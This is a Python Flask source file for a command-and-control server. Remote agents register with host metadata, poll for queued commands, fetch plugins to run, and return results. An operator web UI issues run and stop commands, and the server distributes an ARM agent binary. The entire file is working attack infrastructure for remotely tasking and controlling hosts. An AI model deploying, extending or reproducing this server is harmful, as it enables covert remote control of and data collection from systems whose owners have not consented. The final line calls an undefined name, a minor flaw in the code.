from flask import Flask, send_file, request, send_from_directory, make_response
from utils import genAgentID
from DEF_C2 import AgentConnection, AgentCommand
from pathlib import Path
import hashlib
import json
import time

app = Flask(__name__)

agents={}
plugins={"agent":{}, "c2":{}} # 2 types of plugins agent and c2
display_buffer=[]

@app.route("/register",methods=['POST', 'GET'])
def register_agent():
    id=genAgentID()
    AC = AgentConnection(id)

    # Grab metadata like hosts, arch and userID
    if request.is_json:
        data = request.json
        for x in data:
            setattr(AC, x, data[x])
    
    for x in plugins['agent']:
        AC.command_queue.append(AgentCommand(AgentCommand.DOWNLOAD, {'plugin':x}))   
    
    agents[id]=AC
    
    return {"id" : id}

@app.route("/command/<agent_id>")
def command_for_agent(agent_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    agents[agent_id].last_seen = time.time()
    return agents[agent_id].serve_cmd()

@app.route("/results/<agent_id>/<execution_id>", methods=['POST'])
def results_from_agent(agent_id,execution_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    if execution_id not in agents[agent_id].results:
        return {"error":"Execution ID Not found"}, 400
    data = request.get_json()
    if ("plugin" not in data) or ("result" not in data):
        return {"error":"invalid parameters"}, 400
    if data['result'] in ("STARTED","END"):
        data['result'] = f"Plugin execution {execution_id} has {data['result']}.."
    agents[agent_id].results[execution_id] = data
    display_buffer.append(data)
    return data



@app.route("/download/<agent_id>/<plugin_id>")
def serve_plugin(agent_id,plugin_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    if plugin_id not in plugins['agent']:
        return {"error":"Plugin not found"}, 400
    
    plugin = plugins['agent'][plugin_id]
    plugin_file_path = (plugin / "agent" / "dist" / plugin.name)
    
    return send_file(str(plugin_file_path.resolve()))


@app.route("/ui/agents")
def list_agents():
    agents_processed = agents.copy()
    for x in agents:
        if agents[x].is_alive is False:
            del agents_processed[x]

    data = json.dumps(agents_processed,default=lambda o: o.__dict__)

    response = make_response(data)
    response.headers['Content-Type'] = 'text/json'
    return response

    

@app.route("/ui/plugins")
def list_plugins():
    results={}
    for id in plugins['agent']:
        results[id]={"name":plugins['agent'][id].name}
    return results

@app.route("/ui/sendAgentCmd",methods=['POST'])
def cmd2Agent():
    data = request.json
    if data.get('cmd') == "run":
        targetAgentConnection = agents[data.get('agent')]
        targetAgentConnection.command_queue.append(AgentCommand(AgentCommand.RUN, {'plugin':data.get('plugin'),'args':data.get('args')}))

    elif data.get('cmd') == "stop":
        targetAgentConnection = agents[data.get('agent')]
        targetAgentConnection.command_queue.append(AgentCommand(AgentCommand.STOP))
        agents[data.get('agent')].is_alive = False


    return "Done"


@app.route("/ui/terminal")
def display_update():
    output=display_buffer.copy()
    display_buffer.clear()
    return output


@app.route('/webui/<path:path>')
def send_webui(path):
    return send_from_directory('webui', path)

@app.route('/agent/download')
def send_agent():
    agent_file_path = ("binaries" + "/agent_arm")
    return send_file(str(agent_file_path))



def scanPlugins():
    if Path("plugins").is_dir() is True:
        pluginDir=Path("plugins")
    elif Path("../plugins").is_dir() is True:
        pluginDir=Path("../plugins")
    else:
        exit("cannot find plugin directory")
    for x in pluginDir.iterdir():
        if x.is_dir():
            #First 10 bytes of sha256(plugin name) is the ID
            plugin_id= hashlib.sha256(x.name.encode()).hexdigest()[0:10] 
            if (x/'agent').is_dir():
                plugins['agent'][plugin_id] = x
            if (x/'c2').is_dir():
                plugins['c2'][plugin_id] = x
    


if __name__ == '__main__':
    scanPlugins()
    app.run(host='0.0.0.0',port=9000)
    input(hello)